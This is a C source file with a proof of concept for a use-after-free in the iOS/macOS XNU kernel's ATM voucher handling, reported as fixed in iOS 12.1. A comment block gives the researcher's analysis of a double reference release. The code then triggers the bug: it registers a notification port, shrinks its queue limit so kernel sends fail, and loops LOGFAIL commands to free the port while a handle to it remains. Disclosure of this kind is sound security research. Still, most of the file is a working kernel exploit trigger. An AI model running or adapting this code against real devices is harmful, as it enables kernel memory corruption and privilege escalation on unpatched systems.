#if 0
Discovered by Mohamed GHANNAM (@_simo36)

*OS : extra port release in atm vouchers leads to mach port UAF (fixed in iOS 12.1)

mach_msg_send_from_kernel_proper() and its variants (see ipc_mig.c) are a kernel functions responsible for sending mach messages from the kernel to a destination port, they are pretty similar to mach_msg_send(). if you walk trough the XNU kernel code, you’ll see that they are widely used for sending notifications from kernel to user daemons.

ipc_kmsg_copyin_from_kernel() is used by mach_msg_send_from_kernel_proper() and takes the same role as ipc_kmsg_copyin(), it copies the port rights and OOL data sent from the kernel. If you notice, there’s a specious case, when the mach message type is MACH_MSG_TYPE_MOVE_SEND, it doesn’t get a reference to the port, but later if the mach_msg_send_from_kernel_proper() somehow fails, it will call ipc_kmsg_destroy(), which drops a reference even if mach message type is MACH_MSG_TYPE_MOVE_SEND.

I really don’t know if this is intended from Apple, but if the caller does not properly handle this case, it will produces a serious bug.
More importantly is that the user (attacker) has a receive right to the port used in the message passed to mach_msg_send_from_kernel_proper(), which means he has a lot of control of it, this will be interesting to trigger the bug reliably.

Looking for a potential cases, I came across this function :
kern_return_t
atm_send_user_notification(
                           aid_t aid,
                           mach_atm_subaid_t sub_aid,
                           mach_port_t *buffers_array,
                           uint64_t *sizes_array,
                           mach_msg_type_number_t count,
                           uint32_t flags)
{
    mach_port_t user_port;
    ...
    
    error = host_get_atm_notification_port(host_priv_self(), &user_port);   <---------  (a)
    if ((error != KERN_SUCCESS) || !IPC_PORT_VALID(user_port)) {
        return KERN_FAILURE;
    }
    
    ...
    
    kr = atm_collect_trace_info(user_port, aid, sub_aid, flags, buffers_array, count, sizes_array, count); <--------- (b)
    
    ...
    
    if (kr != KERN_SUCCESS) {
        ipc_port_release_send(user_port);                       <--------- (c)
        
        ...
        
        return kr;
    }
    
    The function takes a user_port which has been registered by a user daemon and takes a reference on it in (a),
    the user_port is used in (b) by atm_collect_trace_info() which is MIG kernel routine, and if (b) failed, it will drop a reference in (c).
    
    Looking into (b) :
    mig_external kern_return_t atm_collect_trace_info
    (
     mach_port_t atm_port,
     atm_aid_t activity_trace_id,
     mach_atm_subaid_t sub_activity_id,
     uint32_t flags,
     atm_memory_descriptor_array_t memory_buffers,
     mach_msg_type_number_t memory_buffersCnt,
     atm_memory_size_array_t buffer_sizes,
     mach_msg_type_number_t buffer_sizesCnt
     )
    {
        
        ...
        
        InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
        MACH_MSGH_BITS(17, 0);                                  <--------- (d)
        /* msgh_size passed as argument */
        InP->Head.msgh_request_port = atm_port;
        InP->Head.msgh_reply_port = MACH_PORT_NULL;
        InP->Head.msgh_id = 11500;
        InP->Head.msgh_reserved = 0;
        
        __BeforeSendSimple(11500, "atm_collect_trace_info")
if     __MigKernelSpecificCode
        msg_result = mach_msg_send_from_kernel(&InP->Head, msgh_size); <--------- (e)
        ...
    }
    
    the atm_port is passed to (e) with MACH_MSG_TYPE_MOVE_SEND (d).
    
    I think the bug becomes clear now, The caller (a) takes a reference, (e) drops it in failure, and (c) drops another reference again,
    so we are front of extra-reference release leads to a dangling port pointer with a valid ipc_entry_t in the (our) task space.
 
#endif

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/mach_traps.h>
#include <mach/mach_voucher.h>
#include <mach/mach_voucher_types.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <pthread.h>

#define CHECK_MACH_ERR(kr,name)   if (kr != KERN_SUCCESS) {\
printf("%s : %s (0x%x)\n",name,mach_error_string(kr),kr); \
}

#define MACH_VOUCHER_ATTR_ATM_NULL         ((mach_voucher_attr_recipe_command_t)501)
#define MACH_VOUCHER_ATTR_ATM_CREATE         ((mach_voucher_attr_recipe_command_t)510)
#define MACH_VOUCHER_ATTR_ATM_REGISTER         ((mach_voucher_attr_recipe_command_t)511)

typedef uint32_t atm_action_t;

#define ATM_ACTION_REGISTER 0x6
#define ATM_ACTION_LOGFAIL    0x3

#define QLIMT   3
typedef uint64_t mach_atm_subaid_t;
typedef uint64_t atm_aid_t;

typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t memory_buffer[512];
    NDR_record_t NDR;
    atm_aid_t activity_trace_id;
    mach_atm_subaid_t sub_activity_id;
    uint32_t flags;
    mach_msg_type_number_t memory_bufferCnt;
    mach_msg_type_number_t buffer_sizeCnt;
    uint64_t buffer_sizes[512];
    mach_msg_trailer_t tr;
} port_msg_rcv_t;

typedef struct {
    mach_port_t *ports;
    uint32_t count;
}ports_t;

void setup_trace_mem_info(void)
{
    kern_return_t kr;
    vm_address_t addr;
    vm_size_t size = 4096;
    mach_port_t q;
    
    kr = vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
    CHECK_MACH_ERR(kr,"mach_vm_allocate()");
    
    kr = mach_make_memory_entry(mach_task_self(), &size, addr, (VM_PROT_READ | VM_PROT_WRITE), &q, 0);
    CHECK_MACH_ERR(kr,"mach_make_memory_entry()");
    
    struct task_trace_memory_info mem = {
        .user_memory_address = addr,
        .buffer_size = size,
        .mailbox_array_size = 0
    };
    kr = task_set_info(mach_task_self(),TASK_TRACE_MEMORY_INFO,(task_info_t)&mem,TASK_TRACE_MEMORY_INFO_COUNT);
    CHECK_MACH_ERR(kr,"task_set_info()");
    printf("task_set_info() succeed \n");
    
}

mach_port_t host_priv = MACH_PORT_NULL;
mach_port_t atm = MACH_PORT_NULL;
ipc_voucher_t vc = MACH_PORT_NULL;
int msg_wait = 3;


/* Create a port to receive kernel notifs then register it into HOST_ATM_NOTIFICATION_PORT
 * Decrease the queue limit to force ipc_kmsg_send() to fail. */
void register_atm_port(void)
{
    kern_return_t kr;
    
    // if atm is not null, register a valid (already) allocated port
    if(atm == MACH_PORT_NULL) {
        kr = mach_port_allocate(mach_task_self(),MACH_PORT_RIGHT_RECEIVE,&atm);
        CHECK_MACH_ERR(kr,"mach_port_allocate()");
        
        kr = mach_port_insert_right(mach_task_self(),atm,atm,MACH_MSG_TYPE_MAKE_SEND);
        CHECK_MACH_ERR(kr,"mach_port_insert_right()");
    }
    
    kr = host_get_host_priv_port(mach_host_self(), &host_priv);
    CHECK_MACH_ERR(kr,"host_get_host_priv_port()");
    printf("[+] we got host_priv : 0x%x \n",host_priv);
    
    /* decrease the queue limit to make ipc_kmsg_send() returns TIMEOUT */
    mach_port_limits_t limits = { .mpl_qlimit = QLIMT };
    kr = mach_port_set_attributes(mach_task_self(), atm, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, sizeof(limits));
    
    
    kr = host_set_special_port(host_priv, HOST_ATM_NOTIFICATION_PORT, atm);
    CHECK_MACH_ERR(kr,"host_set_special_port()");
    printf("[+] our port is registred : 0x%x \n",atm);
}

void *waiting_notif(void *arg)
{
    kern_return_t kr;
    port_msg_rcv_t pmsg = {0};
    
    memset(&pmsg,0x00,sizeof(port_msg_rcv_t));
    printf("[*] Waiting notification\n");
    kr = mach_msg(&pmsg.hdr,MACH_RCV_MSG,0,sizeof(pmsg),atm,MACH_MSG_TIMEOUT_NONE,0);
    CHECK_MACH_ERR(kr,"mach_msg()");
    printf("[+] seems like we got a notification\n");
    
    return NULL;
}

void init_setup(void)
{
    kern_return_t kr;
    pthread_t tid;
    
    mach_voucher_attr_recipe_data_t recipe = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    
    
    kr = host_create_mach_voucher_trap(
            mach_host_self(), 
            (mach_voucher_attr_raw_recipe_array_t)&recipe,  
            sizeof(recipe), &vc);
    CHECK_MACH_ERR(kr,"host_create_mach_voucher_trap()");
    printf("Created mach voucher 0x%x \n",vc);
    
    char out[128] = {0};
    
    /* register our port to receive kernel notitifications */
    register_atm_port();
    
    mach_msg_type_number_t outBsize=128;
    uint64_t guard = 0x1;
    
    /* allocate a task_descriptor and assign it to task->atm_context*/
    setup_trace_mem_info();
    
    //pthread_create(&tid,NULL,waiting_notif,NULL);
    
    /* this is required, we need some listeners */
    kr = mach_voucher_attr_command(vc,MACH_VOUCHER_ATTR_KEY_ATM,ATM_ACTION_REGISTER,
                                   (mach_voucher_attr_content_t)&guard,
                                   sizeof(guard),
                                   (mach_voucher_attr_content_t)out,
                                   &outBsize);
    CHECK_MACH_ERR(kr,"mach_voucher_attr_command(ATM_ACTION_REGISTER)");
    
}


/* refs stands for how many refs already taken by the kernel */
void free_port(uint32_t refs)
{
    printf("free port \n");
    kern_return_t kr;
    int i;
    mach_msg_type_number_t outBsize = 128;
    
    char out[128] = {0};
    //memset(outB,0x43,size);
    uint64_t aid = 0x1010;
    
    
    // drop one extra mach port ref
    int drop = (QLIMT * 2) + refs + 1;
    for(i=0;i< drop;i+=1) {
        printf("iter : %d \n",i);
        kr = mach_voucher_attr_command(vc,MACH_VOUCHER_ATTR_KEY_ATM,ATM_ACTION_LOGFAIL,
                                       (mach_voucher_attr_content_t)&aid,
                                       8,
                                       (mach_voucher_attr_content_t)out,
                                       &outBsize);
        
        CHECK_MACH_ERR(kr,"mach_voucher_attr_command(ATM_ACTION_LOGFAIL)");
        
    }
    
}
int main()
{
    init_setup();
    free_port(1);
    
    printf("Crashed ?\n");

    getchar();
    
    
    return 0;
}


